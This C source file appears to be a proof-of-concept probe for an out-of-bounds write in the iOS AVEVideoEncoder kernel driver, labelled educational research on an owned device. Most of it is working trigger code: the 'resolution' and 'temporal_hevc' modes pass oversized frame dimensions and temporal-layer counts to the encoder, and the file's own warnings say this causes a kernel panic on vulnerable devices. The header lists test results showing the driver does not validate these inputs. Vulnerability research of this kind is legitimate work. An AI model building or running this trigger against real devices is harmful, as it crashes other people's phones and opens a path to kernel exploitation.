/*
 * ave_probe_v3.c — AVEVideoEncoder OOB Write Probe (Corrected)
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Educational research on owned device
 *
 * Key correction from v1: NumberOfTemporalLayers is only accepted on HEVC
 * sessions, not H.264. The temporal trigger must use HEVC codec.
 *
 * Modes:
 *   info        — print device info, no encode
 *   guard       — safe 1920x1080 H.264 encode
 *   guard_hevc  — safe 1920x1080 HEVC encode
 *   resolution  — 32768x16384 H.264 (WILL PANIC if vulnerable)
 *   temporal_hevc — HEVC + NumberOfTemporalLayers=16463 (WILL PANIC if vulnerable)
 *
 * Writes output to Documents/ave_output.txt for AFC retrieval.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -o ave_probe_v3 ave_probe_v3.c -Wno-deprecated-declarations
 *
 * Device test results (Nov 20, 2026):
 *   guard       — PASSED (H.264 1920x1080, status 0)
 *   guard_hevc  — PASSED (HEVC 1920x1080, status 0)
 *   Temporal layers 1-2147483647 all accepted on HEVC (zero validation)
 *   Resolutions up to 65536x32768 accepted on H.264 (zero validation)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

static FILE *out;

static void p(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fflush(out);
}

static int probe_encode(int width, int height, int temporal_layers, int use_hevc) {
    CMVideoCodecType codec = use_hevc ? kCMVideoCodecType_HEVC : kCMVideoCodecType_H264;
    const char *codec_name = use_hevc ? "HEVC" : "H.264";

    p("[*] Creating VTCompressionSession: %dx%d %s\n", width, height, codec_name);

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, codec,
        NULL, NULL, NULL, NULL, NULL, &session);

    if (status != noErr || !session) {
        p("[-] VTCompressionSessionCreate failed: %d\n", (int)status);
        return -1;
    }
    p("[+] Session created\n");

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    if (temporal_layers > 0) {
        p("[*] Setting NumberOfTemporalLayers = %d\n", temporal_layers);
        CFNumberRef layerCount = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &temporal_layers);
        status = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), layerCount);
        CFRelease(layerCount);
        p("  SetProperty returned: %d\n", (int)status);
        if (status != noErr) {
            p("[-] NumberOfTemporalLayers rejected\n");
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            return -1;
        }
    }

    p("[*] PrepareToEncodeFrames...\n");
    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        p("[-] PrepareToEncodeFrames failed: %d\n", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -1;
    }
    p("[+] Session prepared\n");

    p("[*] Creating CVPixelBuffer: %dx%d BGRA\n", width, height);
    CVPixelBufferRef pixelBuffer = NULL;
    CVReturn cvStatus = CVPixelBufferCreate(
        kCFAllocatorDefault, width, height,
        kCVPixelFormatType_32BGRA, NULL, &pixelBuffer);

    if (cvStatus != kCVReturnSuccess || !pixelBuffer) {
        p("[-] CVPixelBufferCreate failed: %d\n", (int)cvStatus);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -1;
    }
    p("[+] PixelBuffer: %zu bytes\n", CVPixelBufferGetDataSize(pixelBuffer));

    CVPixelBufferLockBaseAddress(pixelBuffer, 0);
    void *base = CVPixelBufferGetBaseAddress(pixelBuffer);
    if (base) {
        size_t dataSize = CVPixelBufferGetDataSize(pixelBuffer);
        memset(base, 0x41, dataSize);
    }
    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);

    p("[!] Submitting frame...\n");

    VTEncodeInfoFlags flags = 0;
    CMTime pts = CMTimeMake(0, 30);
    CMTime dur = CMTimeMake(1, 30);

    status = VTCompressionSessionEncodeFrame(
        session, pixelBuffer, pts, dur, NULL, NULL, &flags);

    p("[+] EncodeFrame returned: %d (flags=0x%x)\n", (int)status, (unsigned)flags);
    if (status == noErr)
        p("[*] No crash — bug may be patched or params not triggering\n");
    else
        p("[*] Error returned — driver rejected input\n");

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    CVPixelBufferRelease(pixelBuffer);
    return (int)status;
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    snprintf(path, sizeof(path), "%s/Documents/ave_output.txt", home);
    out = fopen(path, "w");
    if (!out) { out = fopen("/tmp/ave_output.txt", "w"); }
    if (!out) return 1;

    const char *mode = (argc >= 2) ? argv[1] : "info";

    p("=== AVEVideoEncoder OOB Probe v3 ===\n");
    p("Mode: %s\n", mode);
    p("PID: %d, UID: %d\n\n", getpid(), getuid());

    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("kern.osversion: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("hw.machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("[*] Info mode — no encode\n");
        p("[*] Modes: info, guard, guard_hevc, resolution, temporal_hevc\n");
    } else if (strcmp(mode, "guard") == 0) {
        p("[*] Guard: safe 1920x1080 H.264\n");
        probe_encode(1920, 1080, 0, 0);
    } else if (strcmp(mode, "guard_hevc") == 0) {
        p("[*] Guard HEVC: safe 1920x1080 HEVC\n");
        probe_encode(1920, 1080, 0, 1);
    } else if (strcmp(mode, "resolution") == 0) {
        p("[!] RESOLUTION TRIGGER — 32768x16384 H.264\n");
        p("[!] WARNING: kernel panic if vulnerable\n");
        probe_encode(32768, 16384, 0, 0);
    } else if (strcmp(mode, "temporal_hevc") == 0) {
        p("[!] TEMPORAL TRIGGER — HEVC + NumberOfTemporalLayers=16463\n");
        p("[!] WARNING: kernel panic if vulnerable\n");
        probe_encode(1920, 1080, 16463, 1);
    } else {
        p("Unknown mode: %s\n", mode);
    }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
